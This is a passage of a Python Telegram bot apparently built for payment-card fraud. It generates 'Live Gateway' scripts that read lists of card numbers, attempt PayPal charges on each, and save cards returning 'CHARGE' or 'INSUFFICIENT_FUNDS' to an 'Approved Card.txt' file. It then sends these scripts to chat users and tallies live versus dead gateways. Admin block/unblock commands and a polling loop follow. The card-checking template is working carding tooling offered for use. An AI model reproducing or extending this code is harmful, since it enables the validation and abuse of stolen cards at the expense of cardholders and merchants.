        with open(cr, "r") as f:
            crads = f.read().splitlines()
            for P in crads:
                noy += 1
                try:
                    rr = PayPal()
                    itt = rr.Key()
                    resulti = rr.Charge(P)
                except Exception as e:
                    resulti = f'Error {{e}}'
                if 'CHARGE' in resulti or 'INSUFFICIENT_FUNDS' in resulti:
                    with open('Approved Card.txt', "a") as f:
                        f.write(P + ': {{resulti}} > {{Getat}}\\n')
                print(f'[{{noy}}] ' + P + '  >>  ' + resulti)
                time.sleep(13)'''
                        
                        file_name = f'gateway_{live_idx}.py'
                        with open(file_name, 'w', encoding='utf-8') as f:
                            f.write(code)
                        safe_send_document(chat_id, file_name, caption=f"""✅ <b>Live Gateway #{live_idx}</b>\n━━━━━━━━━━━━━━━━━━━━\n🔗 Link: <code>{result['link']}</code>\n━━━━━━━━━━━━━━━━━━━━\n💬 <b>Respons:</b> <code>{result['respons']}</code>\n━━━━━━━━━━━━━━━━━━━━\nDev: @FAWZY30""")
                        os.remove(file_name)
                        time.sleep(2)
                    except Exception as e:
                        print(f"Error sending file: {e}")
                else:
                    processing_status[user_id]['dead'] += 1
                    processing_status[user_id]['current_respons'] = result.get('respons', 'Dead') if result else 'Dead'
            
            time.sleep(2)
        
        with processing_status[user_id]['lock']:
            processing_status[user_id]['done'] = True
            processed = processing_status[user_id]['processed']
            live = processing_status[user_id]['live']
            dead = processing_status[user_id]['dead']
        
        updater.join(timeout=2)
        
        final_text = f"""📊 <b>✅ Complete!</b>\n━━━━━━━━━━━━━━━━━━\n📌 Total Links: {total}\n✅ Live (Sent): {live}\n❌ Dead: {dead}\n💯 Success Rate: {int((live/total)*100) if total > 0 else 0}%\n━━━━━━━━━━━━━━━━━━\nDev: @FAWZY30"""
        
        try:
            safe_edit_message(chat_id, status_msg.message_id, final_text)
        except:
            safe_send_message(chat_id, final_text)
        
        if user_id in processing_status:
            del processing_status[user_id]
            
    except Exception as e:
        safe_send_message(message.chat.id, f"❌ Error: {str(e)[:100]}")

# ═══════════════════════ أوامر الإدارة ═══════════════════════

@bot.message_handler(commands=['block2'])
def block_user(message):
    if str(message.from_user.id) not in admins:
        safe_send_message(message.chat.id, "You do not have permission.")
        return
    try:
        user_id_to_block = message.text.split()[1]
        with open('blockusers.txt', 'a') as file:
            file.write(f"{user_id_to_block}\n")
        safe_send_message(message.chat.id, f"✅ User ID {user_id_to_block} blocked.")
    except:
        safe_send_message(message.chat.id, "Usage: /block2 [user_id]")

@bot.message_handler(commands=['unblock2'])
def unblock_user(message):
    if str(message.from_user.id) not in admins:
        safe_send_message(message.chat.id, "You do not have permission.")
        return
    try:
        user_id_to_unblock = message.text.split()[1]
        with open('blockusers.txt', 'r') as file:
            lines = file.readlines()
        with open('blockusers.txt', 'w') as file:
            for line in lines:
                if line.strip() != user_id_to_unblock:
                    file.write(line)
        safe_send_message(message.chat.id, f"✅ User ID {user_id_to_unblock} unblocked.")
    except:
        safe_send_message(message.chat.id, "Usage: /unblock2 [user_id]")

# ═══════════════════════ تشغيل البوت ═══════════════════════

print('✅ Bot is running...')

while True:
    try:
        bot.polling(
            none_stop=False,
            interval=0,
            timeout=30,
            long_polling_timeout=30
        )
    except KeyboardInterrupt:
        print('🛑 Bot stopped by user')
        break
    except Exception as e:
        error_msg = str(e)
        
        if "502" in error_msg:
            print('⚠️ 502 Bad Gateway. Retrying in 5s...')
            time.sleep(5)
        elif "409" in error_msg:
            print('⚠️ 409 Conflict. Waiting 15s...')
            time.sleep(15)
        elif "429" in error_msg:
            print('⚠️ 429 Too Many Requests. Waiting 30s...')
            time.sleep(30)
        elif "ReadTimeout" in error_msg or "timeout" in error_msg.lower():
            print('⚠️ Timeout. Retrying in 3s...')
            time.sleep(3)
        elif "Connection" in error_msg or "ConnectionError" in error_msg:
            print('⚠️ Connection error. Retrying in 5s...')
            time.sleep(5)
        else:
            print(f'❌ Unexpected error: {error_msg[:100]}')
            time.sleep(5)
